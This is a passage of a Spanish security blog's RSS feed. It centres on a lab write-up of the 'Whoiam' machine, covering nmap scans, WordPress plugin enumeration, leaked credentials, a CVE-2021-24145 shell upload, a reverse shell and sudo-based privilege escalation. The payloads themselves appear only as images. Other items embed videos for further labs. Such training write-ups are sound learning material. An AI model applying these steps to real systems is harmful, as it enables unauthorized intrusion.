+</content:encoded></item><item><title>Whoiam</title><link>https://pylonet.pages.dev/posts/whoiam/</link><guid isPermaLink="true">https://pylonet.pages.dev/posts/whoiam/</guid><description>En la maquina Whoiam emplearemos el CVE-2021-24145 para obtener una shell interactiva en la pagina web Wordpress y lograremos acceso al sistema, tocaremos una escalada de privilegios bastante interesante donde se encuentra en una falla de un codigo eb bash</description><pubDate>Sat, 27 Jul 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Enumeración&lt;/h2&gt;
+&lt;p&gt;Vamos a empezar haciendo un simple escaneo nmap:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ nmap -p- --open -n -Pn -vvv 192.168.1.38
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 17:07 CEST
+Initiating ARP Ping Scan at 17:07
+Scanning 192.168.1.38 [1 port]
+Completed ARP Ping Scan at 17:07, 0.06s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 17:07
+Scanning 192.168.1.38 [65535 ports]
+Discovered open port 80/tcp on 192.168.1.38
+Completed SYN Stealth Scan at 17:07, 3.61s elapsed (65535 total ports)
+Nmap scan report for 192.168.1.38
+Host is up, received arp-response (0.00048s latency).
+Scanned at 2024-05-30 17:07:38 CEST for 4sNot shown: 65533 closed tcp ports (reset)
+PORT
+STATE SERVICE REASON
+80/tcp openhttpsyn-ack ttl 64
+MAC Address: 08:00:27:7A:6F:A1 (Oracle VirtualBox virtual NIC)
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 3.91 seconds
+Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Podremos ver el puerto 80, vamos a realizar el segundo escaneo para ver que está corriendo en ellos y saber un poquito más:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ nmap -p80 -sCV 192.168.1.38
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 17:09 CEST
+Nmap scan report for 192.168.1.38
+Host is up (0.00033s latency).
+PORT
+STATE SERVICE VERSION
+80/tcp open
+http
+Apache httpd 2.4.57 ((Ubuntu))
+|_http-title: InyectShell
+|_http-generator: WordPress 6.5.3
+|_http-server-header: Apache/2.4.57 (Ubuntu)
+MAC Address: 08:00:27:7A:6F:A1 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Service detection performed. Please report any incorrect results at
+https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.48 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Podremos ver que en el puerto 80 está corriendo un Apache con un Wordpress vamos a entrar a ver como es:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/image.png&quot; alt=&quot;&quot; /&gt;
+Podremos ver que es la default que trae &lt;strong&gt;Wordpress&lt;/strong&gt;, vamos a hacer un &lt;strong&gt;reconocimiento&lt;/strong&gt; de &lt;strong&gt;plugins&lt;/strong&gt; a ver si hay algo interesante:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Podremos ver que encontró un plugin que es &lt;strong&gt;Modern Events Calendar Lite&lt;/strong&gt; con la &lt;strong&gt;versión 5.16.2&lt;/strong&gt; , si lo buscamos podremos ver el siguiente &lt;strong&gt;PoC&lt;/strong&gt;:&lt;/p&gt;
+&lt;h2&gt;Intrusión&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;img/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Viendo el &lt;strong&gt;PoC&lt;/strong&gt; podremos ver que &lt;strong&gt;necesitamos&lt;/strong&gt; de un &lt;strong&gt;usuario&lt;/strong&gt; y &lt;strong&gt;contraseña&lt;/strong&gt; validos, asi que probare en hacer un poco de fuzzin a ver si encontramos algo:&lt;/p&gt;
+&lt;p&gt;Después de un rato encontramos una carpeta llamada &lt;strong&gt;backups&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Si nos metemos a ella podremos ver que hay un archivo &lt;strong&gt;.zip&lt;/strong&gt; asi que nos lo vamos a descargar:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Una vez descargado vamos a descomprimirlo:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Podremos ver un archivo llamado &lt;strong&gt;29DBmay&lt;/strong&gt; vamos a ver que contiene:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Podremos ver que son unas credenciales de un &lt;strong&gt;usuario&lt;/strong&gt; llamado &lt;strong&gt;developer&lt;/strong&gt; asi que probaremos en iniciar sesion en el &lt;strong&gt;wp-admin&lt;/strong&gt; para validar que son correctas:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Perfecto &lt;strong&gt;son validas&lt;/strong&gt; asi que ahora &lt;strong&gt;explotaremos&lt;/strong&gt; el &lt;em&gt;PoC&lt;/em&gt; para &lt;em&gt;inyectar la shell&lt;/em&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Vamos a comprobar si funciona:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Perfecto tenemos acceso a &lt;strong&gt;ejecucion de comandos&lt;/strong&gt;, ahora me enviare una &lt;strong&gt;reverse shell&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Ya siendo el usuario &lt;strong&gt;www-data&lt;/strong&gt; veremos si tenemos &lt;strong&gt;permisos sudoers&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Podemos usar como el usuario &lt;strong&gt;rafa&lt;/strong&gt; el &lt;strong&gt;binario&lt;/strong&gt; &lt;strong&gt;find&lt;/strong&gt;, si esto lo buscamos en &lt;a href=&quot;https://gtfobins.github.io/gtfobins/find/#sudo&quot;&gt;GTFObins&lt;/a&gt;, podremos escalar al usuario rafa:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Ya siendo el usuario &lt;strong&gt;rafa&lt;/strong&gt; veremos si tenemos nuevamente &lt;strong&gt;permisos de sudoers&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Podemos usar &lt;strong&gt;debugfs&lt;/strong&gt; como el usuario ruben, asi que nuevamente:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;Escalada de Privilegios&lt;/h2&gt;
+&lt;p&gt;Si vemos nuevamente por &lt;strong&gt;sudoers&lt;/strong&gt; podremos ver ahora que &lt;strong&gt;podemos&lt;/strong&gt; &lt;strong&gt;usar&lt;/strong&gt; un &lt;strong&gt;archivo&lt;/strong&gt; llamado &lt;strong&gt;penguin.sh&lt;/strong&gt; como root:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Si vemos su codigo podremos ver que nos estamos enfrentando a un &lt;a href=&quot;https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/bash-eq-privilege-escalation/&quot;&gt;Bash eq Privilege Escalation&lt;/a&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Esto es un sencillo &lt;strong&gt;script&lt;/strong&gt; en &lt;strong&gt;bash&lt;/strong&gt; que realiza una &lt;strong&gt;comparacion&lt;/strong&gt; &lt;strong&gt;de numeros&lt;/strong&gt;, si vemos el codigo podremos ver que lo &lt;strong&gt;compara&lt;/strong&gt; con el &lt;strong&gt;valor 42&lt;/strong&gt; asi que &lt;strong&gt;probaremos a ejecutar un comando&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Perfecto ahora solo nos pondremos en una &lt;strong&gt;/bin/bash&lt;/strong&gt; o &lt;strong&gt;sh&lt;/strong&gt; como queramos:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+</content:encoded></item><item><title>Eclipse (Video)</title><link>https://pylonet.pages.dev/posts/eclipse/</link><guid isPermaLink="true">https://pylonet.pages.dev/posts/eclipse/</guid><pubDate>Sun, 02 Jun 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&amp;lt;iframe width=&quot;100%&quot; height=&quot;468&quot; src=&quot;https://www.youtube.com/embed/TJRPuyzVS9Q?si=80pFztvbtFurkt1b&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
+&lt;hr /&gt;
+</content:encoded></item><item><title>Liceo (Video)</title><link>https://pylonet.pages.dev/posts/liceo/</link><guid isPermaLink="true">https://pylonet.pages.dev/posts/liceo/</guid><pubDate>Fri, 29 Mar 2024 00:00:00 GMT</pubDate><content:encoded>&lt;hr /&gt;
+&lt;p&gt;&amp;lt;iframe width=&quot;100%&quot; height=&quot;468&quot; src=&quot;https://www.youtube.com/embed/axL8I32x41A?si=z6RjWA9saw_3kpiz&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
+&lt;hr /&gt;
+</content:encoded></item><item><title>Friendly (Video)</title><link>https://pylonet.pages.dev/posts/friendly/</link><guid isPermaLink="true">https://pylonet.pages.dev/posts/friendly/</guid><pubDate>Mon, 04 Mar 2024 00:00:00 GMT</pubDate><content:encoded>&lt;hr /&gt;
+&lt;p&gt;&amp;lt;iframe width=&quot;100%&quot; height=&quot;468&quot; src=&quot;https://www.youtube.com/embed/2Kq_LVcTgyU?si=Qjg9oJf7obC6IGYI&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
+&lt;hr /&gt;
+</content:encoded></item><item><title>Slowman (Video)</title><link>https://pylonet.pages.dev/posts/slowman/</link><guid isPermaLink="true">https://pylonet.pages.dev/posts/slowman/</guid><description>En la maquina Slowman tocaremos mucha fuerza bruta para ir obteniendo las credenciales validas de un usuario. La escalada  de privilegios seran unas capabilities en python.</description><pubDate>Thu, 29 Feb 2024 00:00:00 GMT</pubDate><content:encoded>&lt;hr /&gt;
+&lt;p&gt;&amp;lt;iframe width=&quot;100%&quot; height=&quot;468&quot; src=&quot;https://www.youtube.com/embed/bsM95IbjmrI?si=cvZoMbanKv-tq4Gg&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
+&lt;hr /&gt;
+</content:encoded></item><item><title>Whitedoor (Video)</title><link>https://pylonet.pages.dev/posts/whitedoor/</link><guid isPermaLink="true">https://pylonet.pages.dev/posts/whitedoor/</guid><description>En la maquina Whitedoor tocaremos un simple RCE que nos ofrece la propia web donde ya lograremos una reverse shell como el usuario www-data, luego podremos escalar privilegios mediante SUID</description><pubDate>Sun, 25 Feb 2024 00:00:00 GMT</pubDate><content:encoded>&lt;hr /&gt;
+&lt;p&gt;&amp;lt;iframe width=&quot;100%&quot; height=&quot;468&quot; src=&quot;https://www.youtube.com/embed/QqRW89gfwEg?si=BtUxWlaO3WqOZlz1&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
+&lt;hr /&gt;
+</content:encoded></item></channel></rss>
